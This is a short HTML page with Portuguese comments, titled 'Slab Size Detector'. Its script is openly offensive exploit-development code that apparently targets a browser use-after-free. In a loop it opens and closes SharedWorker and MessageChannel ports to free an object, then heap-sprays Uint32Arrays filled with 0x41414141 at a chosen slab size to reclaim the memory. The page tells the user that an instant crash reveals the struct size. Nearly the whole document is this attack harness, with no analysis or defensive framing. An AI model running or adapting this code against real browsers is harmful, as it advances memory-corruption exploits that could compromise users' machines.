<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Slab Size Detector</title>
    <style>body{background:#111;color:#0f0;font-family:monospace;padding:20px;}</style>
</head>
<body>
    <h2>1. Seletor de Tamanho (Slab Bucket)</h2>
    <p>Escolha um tamanho. Se o crash for INSTANTÂNEO (ex: < 50 iterações), você achou o tamanho da struct.</p>
    
    <label>Tamanho do Objeto de Spray (Bytes):</label>
    <select id="sizeSel">
        <option value="32">32 bytes</option>
        <option value="48">48 bytes</option>
        <option value="64">64 bytes</option>
        <option value="96">96 bytes</option>
        <option value="128">128 bytes (Comum)</option>
        <option value="192">192 bytes</option>
        <option value="256">256 bytes</option>
        <option value="512">512 bytes</option>
        <option value="1024">1024 bytes</option>
    </select>
    <br><br>
    <button onclick="run()">INICIAR FUZZING</button>
    <div id="log">Iter: 0</div>

    <script>
        async function run() {
            const size = parseInt(document.getElementById('sizeSel').value);
            const el = document.getElementById('log');
            let i = 0;

            // Criamos arrays tipados que se alinhem com o alocador do sistema
            // Uint32Array usa 4 bytes por elemento.
            const elementCount = size / 4; 

            // Worker Mínimo
            const blob = new Blob([`onmessage=e=>{}`], {type:'text/javascript'});
            const url = URL.createObjectURL(blob);

            while(true) {
                i++;
                el.innerText = `Size: ${size} | Iter: ${i}`;
                await new Promise(r => setTimeout(r, 5));

                await new Promise(resolve => {
                    const mc = new MessageChannel();
                    const sw = new SharedWorker(url, `fuzz_${size}_${i}`);
                    sw.port.start();
                    sw.port.postMessage("init", [mc.port2]);

                    setTimeout(() => {
                        // 1. FREE
                        sw.port.close();
                        mc.port1.close();

                        // 2. SPRAY IMEDIATO (Tentando ocupar o espaço exato)
                        // Criamos 64 objetos do tamanho escolhido para tentar "cair no buraco"
                        let spray = [];
                        for(let k=0; k<64; k++) {
                            let arr = new Uint32Array(elementCount);
                            arr.fill(0x41414141);
                            spray.push(arr);
                        }

                        setTimeout(() => {
                            spray = null; // Limpa
                            resolve();
                        }, 5);
                    }, 2);
                });
            }
        }
    </script>
</body>
</html>
